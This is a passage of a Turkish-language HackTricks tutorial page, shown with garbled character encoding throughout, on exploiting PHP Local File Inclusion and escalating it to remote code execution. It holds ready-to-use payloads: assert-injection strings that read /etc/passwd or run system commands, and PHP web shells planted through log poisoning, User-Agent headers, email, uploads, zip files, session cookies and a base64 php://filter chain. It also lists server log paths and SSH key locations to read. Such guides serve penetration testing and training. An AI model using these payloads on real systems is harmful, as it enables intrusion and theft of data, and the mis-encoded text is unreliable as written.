LFI'nin yalnÄ±zca PHP kodunu Ã§alÄ±ÅŸtÄ±rmadan dosya okuma iÅŸlemi gerÃ§ekleÅŸtirdiÄŸi durumlarda, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi iÅŸlevler aracÄ±lÄ±ÄŸÄ±yla, bir deserializasyon gÃ¼venlik aÃ§Ä±ÄŸÄ± sÃ¶mÃ¼rÃ¼lebilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, dosyalarÄ±n `phar` protokolÃ¼ kullanÄ±larak okunmasÄ±yla iliÅŸkilidir.

`.phar` dosyalarÄ±nÄ±n baÄŸlamÄ±nda deserializasyon gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rme konusunda detaylÄ± bir anlayÄ±ÅŸ iÃ§in aÅŸaÄŸÄ±daki belgeye baÅŸvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Daha fazla protokol

Daha fazla olasÄ± [**buraya dahil edilebilecek protokoller**](https://www.php.net/manual/en/wrappers.php)**'Ä± kontrol edin:**

* [php://memory ve php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” Bellekte veya geÃ§ici bir dosyada yazma (bu bir dosya dahil etme saldÄ±rÄ±sÄ±nda nasÄ±l kullanÄ±ÅŸlÄ± olabileceÄŸinden emin deÄŸilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” Yerel dosya sistemine eriÅŸim
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URL'lerine eriÅŸim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URL'lerine eriÅŸim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” SÄ±kÄ±ÅŸtÄ±rma AkÄ±ÅŸlarÄ±
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” Deseni eÅŸleÅŸen dosya yollarÄ±nÄ± bulma (YazdÄ±rÄ±labilir bir ÅŸey dÃ¶ndÃ¼rmediÄŸi iÃ§in burada gerÃ§ekten kullanÄ±ÅŸlÄ± deÄŸil)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” GÃ¼venli Kabuk 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Ses akÄ±ÅŸlarÄ± (Keyfi dosyalarÄ± okumak iÃ§in kullanÄ±ÅŸlÄ± deÄŸil)

## PHP'nin 'assert' Ä°le LFI

PHP'de Yerel Dosya Dahil Etme (LFI) riskleri, dizeler iÃ§inde kodu yÃ¼rÃ¼tebilen 'assert' iÅŸleviyle uÄŸraÅŸÄ±rken Ã¶zellikle yÃ¼ksektir. Bu Ã¶zellikle, dizin gezintisi karakterleri iÃ§eren (Ã¶rneÄŸin "..") giriÅŸlerin kontrol edildiÄŸi ancak uygun ÅŸekilde temizlenmediÄŸi durumlarda sorun oluÅŸturabilir.

Ã–rneÄŸin, PHP kodu, dizin gezintisini Ã¶nlemek iÃ§in aÅŸaÄŸÄ±daki gibi tasarlanmÄ±ÅŸ olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'Ä± durdurmayÄ± amaÃ§lasa da, yanlÄ±ÅŸlÄ±kla kod enjeksiyonu iÃ§in bir vektÃ¶r oluÅŸturur. Dosya iÃ§eriÄŸini okumak iÃ§in bunu sÃ¶mÃ¼rmek iÃ§in bir saldÄ±rgan ÅŸunlarÄ± kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer ÅŸekilde, keyfi sistem komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in ÅŸunu kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
**PayloadlarÄ± URL kodlamak Ã¶nemlidir**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## PHP KÃ¶r Yol GeÃ§iÅŸi

{% hint style="warning" %}
Bu teknik, bir dosyaya eriÅŸecek bir PHP iÅŸlevinin **dosya yolunu kontrol ettiÄŸiniz** ancak dosyanÄ±n iÃ§eriÄŸini gÃ¶rmeyeceÄŸiniz durumlarda Ã¶nemlidir (Ã¶rneÄŸin basit bir **`file()`** Ã§aÄŸrÄ±sÄ± gibi) ancak iÃ§erik gÃ¶sterilmez.
{% endhint %}

[**Bu inanÄ±lmaz yazÄ±da**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) kÃ¶r yol geÃ§iÅŸinin bir PHP filtresi aracÄ±lÄ±ÄŸÄ±yla nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸi aÃ§Ä±klanmaktadÄ±r ve bir hata orak aracÄ±lÄ±ÄŸÄ±yla bir dosyanÄ±n iÃ§eriÄŸinin dÄ±ÅŸa aktarÄ±lmasÄ± saÄŸlanmaktadÄ±r.

Ã–zetle, teknik dosyanÄ±n iÃ§eriÄŸini **bÃ¼yÃ¼k** yapmak iÃ§in **"UCS-4LE" kodlamasÄ±nÄ±n** kullanÄ±lmasÄ±dÄ±r, bÃ¶ylece dosyayÄ± aÃ§an PHP iÅŸlevi bir **hata** oluÅŸturacaktÄ±r.

ArdÄ±ndan, ilk karakterin sÄ±zdÄ±rÄ±lmasÄ± iÃ§in **`dechunk`** filtresi kullanÄ±lÄ±rken diÄŸer filtreler arasÄ±nda **base64** veya **rot13** ve son olarak **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** filtreleri kullanÄ±larak **diÄŸer karakterlerin baÅŸÄ±na yerleÅŸtirilmesi ve sÄ±zdÄ±rÄ±lmasÄ±** saÄŸlanÄ±r.

**Zarar gÃ¶rebilecek iÅŸlevler**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (yalnÄ±zca bununla salt okunur hedef)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar iÃ§in belirtilen yazÄ±ya bakÄ±n!

## LFI2RCE

### Uzak Dosya Dahil Etme

Daha Ã¶nce aÃ§Ä±klandÄ±ÄŸÄ± gibi, [**bu baÄŸlantÄ±yÄ± takip edin**](./#remote-file-inclusion).

### Apache/Nginx gÃ¼nlÃ¼k dosyasÄ± Ã¼zerinden

EÄŸer Apache veya Nginx sunucusu **LFI'ye karÅŸÄ± savunmasÄ±zsa** dahil etme iÅŸlevi iÃ§inde **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`**'a eriÅŸmeyi deneyebilir, **kullanÄ±cÄ± ajanÄ±** iÃ§ine veya bir **GET parametresi** iÃ§ine **`<?php system($_GET['c']); ?>`** gibi bir php shell yerleÅŸtirebilir ve o dosyayÄ± dahil edebilirsiniz

{% hint style="warning" %}
**Shell iÃ§in basit tÄ±rnaklar** yerine **Ã§ift tÄ±rnaklar** kullanÄ±rsanÄ±z, Ã§ift tÄ±rnaklar "_**tÄ±rnak;**_" dizesi iÃ§in deÄŸiÅŸtirilecek, **PHP orada bir hata fÄ±rlatacak** ve **baÅŸka bir ÅŸey yÃ¼rÃ¼tÃ¼lmeyecek**.

AyrÄ±ca, **payload'Ä± doÄŸru ÅŸekilde yazdÄ±ÄŸÄ±nÄ±zdan** emin olun, aksi takdirde PHP her log dosyasÄ±nÄ± yÃ¼klemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda hata alacak ve ikinci bir fÄ±rsatÄ±nÄ±z olmayacaktÄ±r.
{% endhint %}

Bu ayrÄ±ca diÄŸer gÃ¼nlÃ¼k dosyalarÄ±nda da yapÄ±labilir ancak **dikkatli olun**, gÃ¼nlÃ¼k dosyasÄ±ndaki kod URL kodlanmÄ±ÅŸ olabilir ve bu Shell'i yok edebilir. **Yetkilendirme "basic"** baÅŸlÄ±ÄŸÄ± Base64'te "kullanÄ±cÄ±:ÅŸifre" iÃ§erir ve gÃ¼nlÃ¼klerde Ã§Ã¶zÃ¼lÃ¼r. PHPShell bu baÅŸlÄ±ÄŸÄ±n iÃ§ine yerleÅŸtirilebilir.\
DiÄŸer olasÄ± gÃ¼nlÃ¼k yollarÄ±:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta AracÄ±lÄ±ÄŸÄ±yla

**Bir e-posta** gÃ¶nderin ve PHP yÃ¼kÃ¼nÃ¼zÃ¼ iÃ§eren bir iÃ§ hesap (user@localhost) (Ã¶rneÄŸin `<?php echo system($_REQUEST["cmd"]); ?>`) ve kullanÄ±cÄ±nÄ±n e-postasÄ±na ÅŸu ÅŸekilde dahil etmeyi deneyin: **`/var/mail/<KULLANICI ADI>`** veya **`/var/spool/mail/<KULLANICI ADI>`**

### /proc/\*/fd/\* AracÄ±lÄ±ÄŸÄ±yla

1. BirÃ§ok shell yÃ¼kleyin (Ã¶rneÄŸin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini dahil edin, burada $PID = iÅŸlemin PID'si (kaba kuvvet uygulanabilir) ve $FD dosya tanÄ±mlayÄ±cÄ±sÄ±dÄ±r (bu da kaba kuvvet uygulanabilir)

### /proc/self/environ AracÄ±lÄ±ÄŸÄ±yla

Bir gÃ¼nlÃ¼k dosyasÄ± gibi, yÃ¼kÃ¼ User-Agent iÃ§inde gÃ¶nderin, bu /proc/self/environ dosyasÄ±nÄ±n iÃ§inde yansÄ±tÄ±lacaktÄ±r
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### YÃ¼kleme yoluyla

Bir dosya yÃ¼kleyebiliyorsanÄ±z, sadece kabuk yÃ¼klemesini iÃ§ine enjekte edin (Ã¶r. : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
DosyayÄ± okunabilir tutmak iÃ§in en iyi yol resimlerin/dokÃ¼manÄ±n/pdf'nin metaverisine enjekte etmektir

### Zip dosyasÄ± yÃ¼kleme yoluyla

PHP kabuÄŸu iÃ§eren sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir ZIP dosyasÄ± yÃ¼kleyin ve eriÅŸin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP oturumlarÄ± aracÄ±lÄ±ÄŸÄ±yla

Websitesinin PHP Oturumu (PHPSESSID) kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol edin.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarÄ±na kaydedilir.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
AÅŸaÄŸÄ±daki kodu kullanarak Ã§erez deÄŸerini `<?php system('cat /etc/passwd');?>` olarak ayarlayÄ±n:

```html
<?php system('cat /etc/passwd');?>
```
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP oturum dosyasÄ±nÄ± dahil etmek iÃ§in LFI'Ä± kullanÄ±n.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSH Ã¼zerinden

EÄŸer ssh etkinse hangi kullanÄ±cÄ±nÄ±n kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa** dosyasÄ±na eriÅŸmeyi deneyin.

### **vsftpd** _**gÃ¼nlÃ¼kleri**_ Ã¼zerinden

FTP sunucusu vsftpd iÃ§in gÃ¼nlÃ¼kler _**/var/log/vsftpd.log**_ konumundadÄ±r. Bir Yerel Dosya Dahil Etme (LFI) zafiyeti mevcut olduÄŸu senaryoda ve aÃ§Ä±k bir vsftpd sunucusuna eriÅŸim saÄŸlanabildiÄŸi durumda, aÅŸaÄŸÄ±daki adÄ±mlar dÃ¼ÅŸÃ¼nÃ¼lebilir:

1. GiriÅŸ iÅŸlemi sÄ±rasÄ±nda kullanÄ±cÄ± adÄ± alanÄ±na bir PHP yÃ¼klemesi enjekte edin.
2. Enjeksiyondan sonra, LFI'Ä± kullanarak _**/var/log/vsftpd.log**_ konumundaki sunucu gÃ¼nlÃ¼klerini alÄ±n.

### PHP base64 filtresi Ã¼zerinden (base64 kullanarak)

[Åu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gÃ¶sterildiÄŸi gibi, PHP base64 filtresi sadece Base64 dÄ±ÅŸÄ±ndakileri yok sayar. Dosya uzantÄ±sÄ± kontrolÃ¼nÃ¼ atlatmak iÃ§in bunu kullanabilirsiniz: EÄŸer ".php" ile biten bir base64 saÄŸlarsanÄ±z, sadece "." iÅŸaretini yok sayacak ve base64'e "php" ekleyecektir. Ä°ÅŸte bir Ã¶rnek yÃ¼k:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Php filtreleri aracÄ±lÄ±ÄŸÄ±yla (dosya gerekli deÄŸil)

Bu [**makale**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), **php filtrelerini kullanarak keyfi iÃ§erik oluÅŸturabileceÄŸinizi** aÃ§Ä±klar. Bu temelde, **bir dosyaya yazmadan** dahil etmek iÃ§in **keyfi php kodu oluÅŸturabilirsiniz**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Segmentasyon hatasÄ± aracÄ±lÄ±ÄŸÄ±yla

`/tmp` iÃ§inde **geÃ§ici olarak saklanacak** bir dosya **yÃ¼kleyin**, ardÄ±ndan **aynÄ± istekte**, bir **segmentasyon hatasÄ±** tetikleyin ve ardÄ±ndan **geÃ§ici dosya silinmeyecek** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx geÃ§ici dosya depolama aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve **Nginx** PHP'nin Ã¶nÃ¼nde Ã§alÄ±ÅŸÄ±yorsa, aÅŸaÄŸÄ±daki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve hatta bir **oturumunuz yoksa** ve `session.auto_start` `Off` ise bile. **`PHP_SESSION_UPLOAD_PROGRESS`**'Ä± **multipart POST** verilerinde saÄŸlarsanÄ±z, PHP **oturumu sizin iÃ§in etkinleÅŸtirir**. Bu, RCE elde etmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php_session_upload_progress.md)
{% endcontent-ref %}

### Windows'ta geÃ§ici dosya yÃ¼klemeleri aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve sunucu **Windows** Ã¼zerinde Ã§alÄ±ÅŸÄ±yorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on) aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve file\_uploads = on olan bir phpinfo() dosyasÄ± varsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Yol AÃ§Ä±ÄŸÄ±nÄ± AÃ§Ä±ÄŸa Ã‡Ä±karma

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve geÃ§ici dosyanÄ±n yolunu **dÄ±ÅŸa Ã§Ä±karabilirseniz** ANCAK **sunucu**, **dahil edilecek dosyanÄ±n PHP iÅŸaretlerine sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol ediyorsa**, bu **YarÄ±ÅŸ KoÅŸulu** ile o kontrolÃ¼ **atlamayÄ±** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz bekleyiÅŸ + kaba kuvvet aracÄ±lÄ±ÄŸÄ±yla

LFI'yi **geÃ§ici dosyalar yÃ¼klemek** iÃ§in kÃ¶tÃ¼ye kullanabilir ve sunucuyu **PHP yÃ¼rÃ¼tmesini askÄ±ya alacak ÅŸekilde** yapabilirsiniz, ardÄ±ndan saatler boyunca geÃ§ici dosyayÄ± bulmak iÃ§in **dosya adlarÄ±nÄ± kaba kuvvet uygulayabilirsiniz**:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Ã–lÃ¼mcÃ¼l Hata Yoluyla

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarÄ±ndan herhangi birini dahil ederseniz. (Bu hatayÄ± atmak iÃ§in aynÄ± dosyayÄ± 2 kez dahil etmeniz gerekir).

**Bu nasÄ±l yararlÄ± olacaÄŸÄ±nÄ± bilmiyorum ama olabilir.**\
_EÄŸer bir PHP Ã–lÃ¼mcÃ¼l HatasÄ± oluÅŸturursanÄ±z, yÃ¼klenen PHP geÃ§ici dosyalarÄ± silinir._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve hata avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
BaÅŸlatÄ±lan en yeni hata avcÄ±lÄ±klarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek hacking hilelerinizi paylaÅŸÄ±n.

</details>
